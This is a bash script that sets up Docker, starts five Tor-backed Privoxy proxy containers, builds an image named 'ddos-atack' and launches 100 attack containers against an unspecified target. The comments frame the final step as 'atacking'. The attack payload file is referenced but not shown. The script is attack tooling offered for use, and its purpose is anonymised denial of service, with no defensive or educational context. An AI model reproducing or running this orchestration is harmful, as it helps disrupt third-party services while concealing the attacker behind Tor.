#!/bin/bash

#-----------------------------
#       Created by: 
#        João Carlos, Lukas Sousa, Nicolas Gomes
#
#       Phantom Corp
#
#-----------------------------


IMAGE_NAME="ddos-atack" 
PROXY_URL="http://localhost:8118"


#-----------------------------
#       Terminal colors
#-----------------------------
BLUE="\e[00;34m"
GREEN="\e[00;32m"
BOLD_YELLOW="\e[01;33m"
CYAN="\e[0;31m"
END="\e[00m"

#-----------------------------
#       Creating images
#-----------------------------
docker_install(){
    echo "n\n\n$GREEN [+] Start instalation docker...$END\n\n\n"
    sudo apt-get update
    sudo apt-get -y install curl git ruby-full apt-transport-https ca-certificates gnupg2 software-properties-common

    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -

    echo "deb [arch=amd64] deb https://download.docker.com/linux/debian bullseye stable" >> /etc/apt/sources.list

    sudo apt-get update

    sudo apt-get -y install docker-ce

    echo -e "\n\n\n$GREEN[+] Enabling docker service...$END\n\n\n"
    sleep 1

    sudo systemctl enable docker
    sudo systemctl start docker

    echo -e "\n\n\n$GREEN[+] Docker service start...$END\n\n\n"
}

proxy_config(){
    echo -e "\n\n$GREEN [+] Start building proxy image...$END\n\n\n"
    docker build -t privoxy -f ./privoxy/Dockerfile.TOR .

    sleep 1
    echo -e "\n\n$GREEN [+] Starting proxy containers...$END\n\n\n"
    
    for i in $(seq 1 5)
    do
        docker run -d --name privoxy_$i -p $((8118+$i)):8118 -p $((9050+$i)):9050 privoxy
        
        # Tempo de espera para garantir que o container foi inicializado
        sleep 2

        echo -e "\n$GREEN[+] Testing proxy privoxy_$i on port $((8118+$i))...$END"

        # Testar se o proxy está funcionando corretamente usando curl
        response=$(curl -s -x 127.0.0.1:$((8118+$i)) http://ifconfig.es)

        # Verifica se a resposta contém um endereço IP
        if [[ $response =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo -e "$GREEN[+] Proxy privoxy_$i (127.0.0.1:$((8118+$i))) is working. Public IP: $response$END"
        else
            echo -e "$RED[-] Proxy privoxy_$i (127.0.0.1:$((8118+$i))) failed. Check the container.$END"
        fi

        sleep 1
    done
}

app_config(){
    echo "n\n\n$GREEN [+] Start build app image...$END\n\n\n"
    docker build -t ddos-atack -f ./Dockerfile.app .

    sleep 1
}


#-------------------------------------
#   Creating containers and atacking
#-------------------------------------
generate_attack(){
    for i in $(seq 1 100)
    do
        docker run -d --name "app_attack_$i" $IMAGE_NAME
        echo "n\n\n$GREEN [+] Create container app_attack_$i...$END\n\n\n"
    done

    echo "Todos os 100 containers foram criados."
}

main(){
    docker_install
    proxy_config
    app_config
    generate_attack
}

main